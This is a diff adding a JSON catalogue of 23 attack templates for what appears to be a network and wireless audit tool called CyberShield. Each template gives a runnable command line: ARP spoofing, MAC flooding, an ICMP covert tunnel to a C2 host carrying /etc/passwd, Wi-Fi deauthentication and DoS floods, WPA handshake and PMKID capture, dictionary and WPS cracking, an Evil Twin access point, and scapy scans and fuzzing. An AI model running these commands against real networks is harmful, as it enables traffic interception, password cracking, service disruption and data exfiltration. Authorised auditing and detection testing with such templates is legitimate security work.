@@ -1,0 +1,403 @@
+[
+    {
+        "_comment": "=== PLANTILLA 1/23 — LAN INFRASTRUCTURE ===",
+        "_comment2": "Descubrimiento de hosts en la red local mediante barrido ping (Nmap -sn)",
+        "id": "nmap-host-discovery",
+        "name": "Nmap Host Discovery",
+        "module": "network-audit",
+        "mitre_id": "T1046",
+        "description": "Realiza un escaneo de red avanzado. Permite configurar el tipo de escaneo (Ping Sweep, SYN, UDP) y opciones adicionales como fingerprinting de OS y servicios para obtener una topología detallada de la infraestructura.",
+        "severity": "low",
+        "status": "validated",
+        "command_base": "sudo nmap {{scan_type}} {{flags}} {{target}} -oX /tmp/cs_nmap_{{timestamp}}.xml",
+        "params": {
+            "target": "",
+            "scan_type": "-sS",
+            "flags": "-sV -O -F"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Nmap Host Discovery on {{target}} - MITRE:T1046'"
+    },
+    {
+        "_comment": "=== PLANTILLA 2/23 — LAN INFRASTRUCTURE ===",
+        "_comment2": "Inundación de direcciones MAC para desbordar la tabla CAM del switch",
+        "id": "mac-flooding",
+        "name": "MAC Flooding",
+        "module": "network-audit",
+        "mitre_id": "T1557",
+        "description": "Inunda la tabla CAM del switch con miles de direcciones MAC falsas usando macof. Al desbordar la tabla, el switch pasa a modo hub y reenvía todo el tráfico a todos los puertos, permitiendo la captura de paquetes ajenos.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo timeout 15 macof -i {{interface}} -d {{target}} -n {{count}}",
+        "params": {
+            "interface": "eth0",
+            "target": "10.0.2.15",
+            "count": "5000"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: MAC Flooding on {{interface}} - {{count}} packets - MITRE:T1557'"
+    },
+    {
+        "_comment": "=== PLANTILLA 3/23 — LAN INFRASTRUCTURE ===",
+        "_comment2": "Robo de puerto del switch mediante suplantación ARP con bettercap",
+        "id": "port-stealing",
+        "name": "Switch Port Stealing",
+        "module": "network-audit",
+        "mitre_id": "T1557",
+        "description": "Ejecuta un ataque de ARP spoofing dirigido con bettercap para suplantar la identidad de un host y redirigir su tráfico. El switch asocia la MAC objetivo con el puerto del atacante, desviando el flujo de datos.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo bettercap -iface {{interface}} -eval \"set arp.spoof.targets {{target}}; arp.spoof on; sleep 10; exit\"",
+        "params": {
+            "interface": "eth0",
+            "target": "AA:BB:CC:DD:EE:FF"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Switch Port Stealing on {{interface}} targeting {{target}} - MITRE:T1557'"
+    },
+    {
+        "_comment": "=== PLANTILLA 4/23 — LAN INFRASTRUCTURE ===",
+        "_comment2": "Captura de tráfico mediante espejo de puerto SPAN en el switch",
+        "id": "span-mirror",
+        "name": "SPAN / Port Mirror",
+        "module": "network-audit",
+        "mitre_id": "T1040",
+        "description": "Captura tráfico de red mediante un puerto SPAN/mirror configurado en el switch. Utiliza tcpdump para registrar los primeros 200 paquetes en formato pcap, permitiendo su análisis posterior con herramientas como Wireshark.",
+        "severity": "medium",
+        "status": "validated",
+        "command_base": "sudo tcpdump -i {{interface}} -c 200 -w /tmp/cs_mirror_{{timestamp}}.pcap 2>&1 && echo 'Capture complete'",
+        "params": {
+            "interface": "eth0",
+            "vlan": "10"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: SPAN/Port Mirror capture on {{interface}} VLAN {{vlan}} - MITRE:T1040'"
+    },
+    {
+        "_comment": "=== PLANTILLA 5/23 — LAN INFRASTRUCTURE ===",
+        "_comment2": "Creación de túneles encubiertos para exfiltrar datos por canales no convencionales",
+        "id": "covert-channel",
+        "name": "Túneles / Canales Encubiertos",
+        "module": "network-audit",
+        "mitre_id": "T1572",
+        "description": "Establece un canal encubierto mediante ptunnel-ng que encapsula tráfico TCP dentro de paquetes ICMP. Permite evadir firewalls y sistemas de detección al ocultar comunicaciones C2 dentro de protocolos legítimos como ping.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo ptunnel-ng -p {{target}} -l 8000 -r {{target}} -R 22 2>&1 | head -20 || echo 'Tunnel test completed'",
+        "params": {
+            "protocol": "icmp",
+            "target": "c2.test.local",
+            "payload": "/etc/passwd"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Covert Channel ({{protocol}}) tunnel to {{target}} with payload {{payload}} - MITRE:T1572'"
+    },
+    {
+        "_comment": "=== PLANTILLA 6/23 — WIRELESS ===",
+        "_comment2": "Ataque de des-autenticación para desconectar clientes de su punto de acceso",
+        "id": "deauth",
+        "name": "Des-autenticación",
+        "module": "wireless-audit",
+        "mitre_id": "T1498",
+        "description": "Envía tramas de des-autenticación 802.11 falsificadas al punto de acceso objetivo, forzando la desconexión de uno o todos los clientes. Puede usarse como precursor para capturar el handshake WPA en la reconexión.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo aireplay-ng -0 10 -a {{bssid}} {{client_flag}} {{interface}}",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": "",
+            "client": ""
+        },
+        "_notes": "client_flag se resuelve como '-c {{client}}' si client != 'broadcast', de lo contrario queda vacío",
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Deauthentication attack on BSSID {{bssid}} client {{client}} via {{interface}} - MITRE:T1498'"
+    },
+    {
+        "_comment": "=== PLANTILLA 7/23 — WIRELESS ===",
+        "_comment2": "Falsa autenticación contra un AP para asociarse sin credenciales válidas",
+        "id": "fake-auth",
+        "name": "Falsa Autenticación",
+        "module": "wireless-audit",
+        "mitre_id": "T1557",
+        "description": "Realiza una falsa autenticación contra el punto de acceso objetivo usando aireplay-ng. Establece una asociación ilegítima con el AP, requisito previo para ataques de inyección de paquetes en redes WEP.",
+        "severity": "medium",
+        "status": "validated",
+        "command_base": "sudo aireplay-ng -1 6000 -o 1 -q 10 -a {{bssid}} {{interface}}",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Fake Authentication against BSSID {{bssid}} on {{interface}} - MITRE:T1557'"
+    },
+    {
+        "_comment": "=== PLANTILLA 8/23 — WIRELESS ===",
+        "_comment2": "Ataque con tramas CTS para provocar denegación de servicio en la red Wi-Fi",
+        "id": "cts-frame",
+        "name": "CTS Frame Attack",
+        "module": "wireless-audit",
+        "mitre_id": "T1498",
+        "description": "Inyecta tramas CTS (Clear To Send) falsificadas usando mdk3 para silenciar la red Wi-Fi. Todos los dispositivos respetan la ventana de tiempo reservada en el CTS, provocando una denegación de servicio efectiva.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo mdk3 {{interface}} c -t {{bssid}} -w 1 2>&1 | head -20",
+        "params": {
+            "interface": "wlan0mon",
+            "duration": "30"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: CTS Frame Attack on {{interface}} duration {{duration}}s - MITRE:T1498'"
+    },
+    {
+        "_comment": "=== PLANTILLA 9/23 — WIRELESS ===",
+        "_comment2": "Inundación con beacons falsos para crear redes Wi-Fi fantasma",
+        "id": "beacon-flood",
+        "name": "Beacon Flood Mode",
+        "module": "wireless-audit",
+        "mitre_id": "T1498.001",
+        "description": "Genera cientos de beacons falsos con SSIDs aleatorios o predefinidos usando mdk3. Los dispositivos cercanos ven decenas de redes inexistentes, causando confusión y dificultando la conexión a la red legítima.",
+        "severity": "medium",
+        "status": "validated",
+        "command_base": "sudo mdk3 {{interface}} b -f {{ssidList}} -c 6 2>&1 | head -20",
+        "params": {
+            "interface": "wlan0mon",
+            "ssidList": "/usr/share/ssids.txt"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Beacon Flood on {{interface}} using SSID list {{ssidList}} - MITRE:T1498.001'"
+    },
+    {
+        "_comment": "=== PLANTILLA 10/23 — WIRELESS ===",
+        "_comment2": "Disociación masiva de clientes (modo Amok) para causar DoS en la red Wi-Fi",
+        "id": "dissoc-amok",
+        "name": "Dissociation Amok",
+        "module": "wireless-audit",
+        "mitre_id": "T1498",
+        "description": "Envía tramas de disociación masivas usando mdk3 en modo 'd' (deauth/dissoc) contra un BSSID específico. Desconecta repetidamente a todos los clientes del AP, provocando una denegación de servicio persistente.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo mdk3 {{interface}} d -b {{bssid}} 2>&1 | head -20",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Dissociation Amok attack on BSSID {{bssid}} via {{interface}} - MITRE:T1498'"
+    },
+    {
+        "_comment": "=== PLANTILLA 11/23 — WIRELESS ===",
+        "_comment2": "Explotación de la vulnerabilidad Michael en TKIP para forzar el apagado del AP",
+        "id": "michael-shutdown",
+        "name": "Michael Shutdown",
+        "module": "wireless-audit",
+        "mitre_id": "T1499",
+        "description": "Explota la vulnerabilidad del algoritmo Michael en redes TKIP/WPA usando mdk3. Genera fallos de integridad MIC que fuerzan al AP a desactivar temporalmente la interfaz inalámbrica como medida de protección.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo mdk3 {{interface}} m -t {{bssid}} 2>&1 | head -20",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Michael Shutdown exploitation on BSSID {{bssid}} via {{interface}} - MITRE:T1499'"
+    },
+    {
+        "_comment": "=== PLANTILLA 12/23 — WIRELESS ===",
+        "_comment2": "Captura del handshake WPA/WPA2 de 4 vías para posterior cracking offline",
+        "id": "handshake-capture",
+        "name": "Captura/Análisis Handshake",
+        "module": "wireless-audit",
+        "mitre_id": "T1040",
+        "description": "Captura el handshake WPA/WPA2 de 4 vías (EAPOL) mediante airodump-ng filtrando por canal y BSSID. El handshake capturado puede ser usado posteriormente para ataques de diccionario o fuerza bruta offline.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo timeout 30 airodump-ng -c {{channel}} --bssid {{bssid}} -w /tmp/cs_handshake_{{timestamp}} {{interface}} 2>&1 | tail -5",
+        "params": {
+            "interface": "wlan0mon",
+            "channel": "6",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: WPA Handshake capture on BSSID {{bssid}} channel {{channel}} via {{interface}} - MITRE:T1040'"
+    },
+    {
+        "_comment": "=== PLANTILLA 13/23 — WIRELESS ===",
+        "_comment2": "Ataque de fuerza bruta o diccionario contra el handshake WPA capturado",
+        "id": "brute-force",
+        "name": "Fuerza Bruta / Diccionario",
+        "module": "wireless-audit",
+        "mitre_id": "T1110",
+        "description": "Ejecuta un ataque de diccionario contra un handshake WPA/WPA2 capturado usando aircrack-ng. Prueba cada contraseña del archivo wordlist contra el handshake hasta encontrar una coincidencia o agotar el diccionario.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo aircrack-ng -w {{wordlist}} {{capture}} 2>&1 | tail -20",
+        "params": {
+            "capture": "/tmp/capture.cap",
+            "wordlist": "/usr/share/wordlists/rockyou.txt"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Brute Force / Dictionary attack using wordlist {{wordlist}} on capture {{capture}} - MITRE:T1110'"
+    },
+    {
+        "_comment": "=== PLANTILLA 14/23 — WIRELESS ===",
+        "_comment2": "Creación de un punto de acceso gemelo malicioso (Evil Twin) para interceptar tráfico",
+        "id": "evil-twin",
+        "name": "Evil Twin",
+        "module": "wireless-audit",
+        "mitre_id": "T1557.002",
+        "description": "Crea un punto de acceso falso (Evil Twin) con el mismo SSID que la red legítima usando airbase-ng. Los clientes se conectan al AP malicioso creyendo que es el legítimo, permitiendo la interceptación de todo su tráfico.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo airbase-ng -a {{bssid}} --essid \"{{ssid}}\" -c {{channel}} {{interface}} 2>&1 | head -10",
+        "params": {
+            "interface": "wlan0mon",
+            "ssid": "CorpWiFi",
+            "channel": "6"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Evil Twin AP deployed SSID={{ssid}} channel={{channel}} on {{interface}} - MITRE:T1557.002'"
+    },
+    {
+        "_comment": "=== PLANTILLA 15/23 — WIRELESS ===",
+        "_comment2": "Captura de PMKID sin necesidad de clientes conectados al AP",
+        "id": "pmkid",
+        "name": "Clientless PMKID",
+        "module": "wireless-audit",
+        "mitre_id": "T1110.002",
+        "description": "Captura el PMKID del primer mensaje EAPOL sin necesidad de esperar a que un cliente se conecte. Utiliza hcxdumptool para solicitar la asociación y extraer el PMKID, que puede ser crackeado offline con hashcat.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo hcxdumptool -i {{interface}} --enable_status=1 -o /tmp/cs_pmkid_{{timestamp}}.pcapng 2>&1 | head -10",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: PMKID clientless capture on BSSID {{bssid}} via {{interface}} - MITRE:T1110.002'"
+    },
+    {
+        "_comment": "=== PLANTILLA 16/23 — WIRELESS ===",
+        "_comment2": "Descubrimiento de redes Wi-Fi ocultas (sin SSID broadcast)",
+        "id": "hidden-ssid",
+        "name": "Redes Ocultas",
+        "module": "wireless-audit",
+        "mitre_id": "T1046",
+        "description": "Identifica redes Wi-Fi ocultas (que no emiten su SSID en beacons) mediante airodump-ng. Monitoriza las probe requests y probe responses para revelar el SSID real de la red que intenta mantenerse invisible.",
+        "severity": "low",
+        "status": "validated",
+        "command_base": "sudo airodump-ng {{interface}} --bssid {{bssid}} 2>&1 | head -20",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: Hidden SSID discovery on BSSID {{bssid}} via {{interface}} - MITRE:T1046'"
+    },
+    {
+        "_comment": "=== PLANTILLA 17/23 — WIRELESS ===",
+        "_comment2": "Ataques contra WPS: Pixie Dust (offline) o fuerza bruta de PIN",
+        "id": "wps-attack",
+        "name": "Ataques WPS",
+        "module": "wireless-audit",
+        "mitre_id": "T1110",
+        "description": "Explota vulnerabilidades en el protocolo WPS (Wi-Fi Protected Setup) mediante Reaver. Soporta modo Pixie Dust (-K 1) para cracking offline instantáneo o fuerza bruta online del PIN de 8 dígitos del AP.",
+        "severity": "high",
+        "status": "validated",
+        "command_base": "sudo reaver -i {{interface}} -b {{bssid}} -vv -K 1 2>&1 | tail -20",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": "",
+            "method": "pixie"
+        },
+        "_notes": "Usar '-K 1' para método Pixie Dust; eliminar '-K 1' para fuerza bruta de PIN online",
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: WPS Attack ({{method}}) on BSSID {{bssid}} via {{interface}} - MITRE:T1110'"
+    },
+    {
+        "_comment": "=== PLANTILLA 18/23 — WIRELESS ===",
+        "_comment2": "Cracking automático de redes WEP mediante captura y análisis de IVs",
+        "id": "wep-attack",
+        "name": "Ataques WEP",
+        "module": "wireless-audit",
+        "mitre_id": "T1110",
+        "description": "Ejecuta un ataque automatizado contra redes WEP usando besside-ng. Captura vectores de inicialización (IVs) y realiza el cracking estadístico de la clave WEP de forma autónoma, explotando las debilidades conocidas del cifrado RC4.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo besside-ng -b {{bssid}} {{interface}} 2>&1 | tail -20",
+        "params": {
+            "interface": "wlan0mon",
+            "bssid": ""
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: WEP cracking attack on BSSID {{bssid}} via {{interface}} - MITRE:T1110'"
+    },
+    {
+        "_comment": "=== PLANTILLA 19/23 — SCAPY LAB ===",
+        "_comment2": "Escaneo sigiloso mediante paquetes TCP SYN.",
+        "id": "scapy-syn-scan",
+        "name": "Scapy SYN Scan (Half-Open)",
+        "module": "scapy-lab",
+        "mitre_id": "T1046",
+        "description": "Escaneo sigiloso. Envía un paquete SYN y analiza si la respuesta es SYN-ACK (Abierto) o RST (Cerrado).",
+        "severity": "medium",
+        "status": "validated",
+        "command_base": "sudo python3 -c \"from scapy.all import *; resp=sr1(IP(dst='{{target}}')/TCP(dport={{port}},flags='S'),timeout=1,verbose=0); print('Port {{port}} is OPEN' if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12 else 'Port {{port}} is CLOSED/FILTERED')\"",
+        "params": {
+            "target": "192.168.1.100",
+            "port": "80"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: SYN Scan detected targeting {{target}} - MITRE:T1046'"
+    },
+    {
+        "_comment": "=== PLANTILLA 20/23 — SCAPY LAB ===",
+        "_comment2": "Mapeo de reglas de firewall con paquetes ACK.",
+        "id": "scapy-ack-scan",
+        "name": "Scapy ACK Scan (Firewall Bypass)",
+        "module": "scapy-lab",
+        "mitre_id": "T1046",
+        "description": "Identifica si un puerto está filtrado por un firewall enviando un paquete ACK huérfano.",
+        "severity": "medium",
+        "status": "validated",
+        "command_base": "sudo python3 -c \"from scapy.all import *; resp=sr1(IP(dst='{{target}}')/TCP(dport={{port}},flags='A'),timeout=1,verbose=0); print('Port {{port}} is UNFILTERED (RST received)' if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x14 else 'Port {{port}} is FILTERED (No response/ICMP)')\"",
+        "params": {
+            "target": "192.168.1.100",
+            "port": "80"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: ACK Scan detected targeting {{target}} - MITRE:T1046'"
+    },
+    {
+        "_comment": "=== PLANTILLA 21/23 — SCAPY LAB ===",
+        "_comment2": "Descubrimiento de hosts en la red local vía ARP.",
+        "id": "scapy-arp-scan",
+        "name": "Scapy ARP Scan (Host Discovery)",
+        "module": "scapy-lab",
+        "mitre_id": "T1018",
+        "description": "Descubrimiento de hosts activos en la red local solicitando direcciones MAC a través de ARP.",
+        "severity": "low",
+        "status": "validated",
+        "command_base": "sudo python3 -c \"from scapy.all import *; ans,unans=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='{{subnet}}'),timeout=2,verbose=0); print('Activos:\\n' + '\\n'.join([rcv.sprintf('%Ether.src% - %ARP.psrc%') for snd,rcv in ans]))\"",
+        "params": {
+            "subnet": "192.168.1.0/24"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: ARP Scan detected targeting {{subnet}} - MITRE:T1018'"
+    },
+    {
+        "_comment": "=== PLANTILLA 22/23 — SCAPY LAB ===",
+        "_comment2": "Ataque DoS inyectando payloads ICMP malformados.",
+        "id": "scapy-icmp-fuzz",
+        "name": "Scapy ICMP Fuzzing",
+        "module": "scapy-lab",
+        "mitre_id": "T1498",
+        "description": "Técnica de fuzzing. Envía paquetes ICMP con cargas útiles y campos aleatorios malformados para buscar caídas de servicio.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo python3 -c \"from scapy.all import *; import random; send(IP(dst='{{target}}')/ICMP(type=8)/Raw(load=bytes([random.randint(0,255) for _ in range({{payload_size}})])), count={{count}}, verbose=0); print('Enviados {{count}} paquetes ICMP malformados')\"",
+        "params": {
+            "target": "192.168.1.100",
+            "payload_size": "64",
+            "count": "100"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: ICMP Fuzzing detected targeting {{target}} - MITRE:T1498'"
+    },
+    {
+        "_comment": "=== PLANTILLA 23/23 — SCAPY LAB ===",
+        "_comment2": "Ataque DoS enviando paquetes TCP malformados.",
+        "id": "scapy-tcp-fuzz",
+        "name": "Scapy TCP Fuzzing",
+        "module": "scapy-lab",
+        "mitre_id": "T1498",
+        "description": "Fuzzing a nivel de transporte. Bombardea un puerto específico con paquetes TCP malformados aleatoriamente.",
+        "severity": "critical",
+        "status": "validated",
+        "command_base": "sudo python3 -c \"from scapy.all import *; import random; send(IP(dst='{{target}}')/TCP(dport={{port}},flags=random.choice(['S','A','F','R','P','U']))/Raw(load=bytes([random.randint(0,255) for _ in range(64)])), count={{count}}, verbose=0); print('Enviados {{count}} paquetes TCP fuzzing')\"",
+        "params": {
+            "target": "192.168.1.100",
+            "port": "80",
+            "count": "100"
+        },
+        "post_attack_notify": "logger -t CyberShield -p local0.alert 'SEC_VIOLATION: TCP Fuzzing detected targeting {{target}} - MITRE:T1498'"
+    }
+]
